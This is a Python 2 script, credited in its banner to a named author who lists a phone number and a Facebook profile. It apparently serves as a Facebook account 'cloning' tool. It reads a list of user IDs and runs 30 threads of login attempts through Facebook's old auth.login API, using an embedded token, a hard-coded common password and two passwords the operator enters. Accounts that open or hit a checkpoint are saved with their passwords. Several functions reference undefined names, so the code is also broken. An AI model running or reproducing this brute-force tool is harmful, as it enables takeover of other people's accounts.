#!/usr/bin/python
# coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(3.0 / 200)
def tik():
    titik = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mLoa\x1b[1;90mding \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)




back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")

####Logo####

logo1 = """


      \x1b[0;33m ######   #######  ##     ## #### 
      \x1b[0;35m##    ## ##     ## ###   ###  ##  
      \x1b[0;33m##       ##     ## #### ####  ##  
       \x1b[0;35m######  ##     ## ## ### ##  ##  
      \x1b[0;33m      ## ##     ## ##     ##  ##  
      \x1b[0;35m##    ## ##     ## ##     ##  ##  
       \x1b[0;33m######   #######  ##     ## #### 
       \x1b[101m\x1b[37;1mCODED BY anzamam-Altaf\x1b[0m
       \x1b[101m\x1b[37;1m  God is greater  \x1b[0m
\033[1;97m-----------------------------------------------
\x1b[0;31m⋟\x1b[0;32m DEVOLPER   : \x1b[0;31m ANZAMAM ALTAF   
\x1b[0;31m⋟ \x1b[0;32mWHATSAAP   :  \x1b[0;31m03557117981 
\x1b[0;31m⋟ \x1b[0;32mFACEBOOK   https://www.facebook.com/anzamam.altafchughtai.391:  \x1b[0;31
\033[1;97m-----------------------------------------------"""
 


##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
        os.system('clear')
        print logo1
      
        print '\x1b[1;97m(1) Without Cloning'
        pilih_Somi()

def pilih_ANZAMAM():
    ANZAMAM = raw_input("\n\033[1;95m•➢ \033[1;96m")
    if ANZAMAM =="":
        print "\x1b[1;97mFill In Correctly"
        pilih_login()
    elif ANZAMAM =="1":              
    	tik()
        os.system("clear")
        print logo1
        
        
        
        try:

           
            idlist = raw_input("\033[1;97mfile  : ")
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print '[!] File Not Found'
            raw_input("\n[ Back ]")
            menu()
    elif Anzamam =='0':
    	tik()
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    p = raw_input("\n\033[1;95mPassword➢ \033[1;96m")
    p1 = raw_input("\n\033[1;95mPassword➢ \033[1;96m")
    print 47* '\033[1;96m▬'
    xxx = str(len(id))
    jalan ('\033[1;96m➾ TOTAL IDS NUMBER : '+xxx)
    
    jalan ("\033[1;93m➾ PLEASE WAIT, PROCESS IS START ..")
    jalan ("\033[1;91m➾ TO STOP THIS PROCESS PRESS Ctrl THEN z")
    print 47* '\033[1;96m▬'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = "786786"
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m   (Open \x1b[1;96mNow\x1b[1;92m)  ' + user + '\x1b[1;91m ● \x1b[1;95m' + pass1                                       
                okb = open('sdcard/ids/successful.txt', 'a')
                okb.write(user+pass1+'\n')
                okb.close()
                oks.append(user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;92m   (Aftar \x1b[1;97m7days\x1b[1;93m) ' + user + '\x1b[1;91m ● \x1b[1;96m ' + pass1
                    cps = open('sdcard/ids/checkpoint.txt', 'a')
                    cps.write(user+pass1+'\n')
                    cps.close()
                    cpb.append(user+pass1)
                else:
                    pass2 = p1
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m   (Open \x1b[1;96mNow\x1b[1;92m)  ' + user +  '\x1b[1;91m ● \x1b[1;95m' + pass2
                        okb = open('sdcard/ids/successful.txt', 'a')
                        okb.write(user+pass2+'\n')
                        okb.close()
                        oks.append(user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;92m   (Aftar \x1b[1;97m7days\x1b[1;93m) ' + user + '\x1b[1;91m ● \x1b[1;96m' + pass2
                            cps = open('sdcard/ids/checkpoint.txt', 'a')
                            cps.write(user+pass2+'\n')
                            cps.close()
                            cpb.append(user+pass2)
                                                                                                                                            
                                                                                                                                                                                                         
        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
    print('Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your Offline account Will Open after 10 to 20 days")
    print ''
    
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()



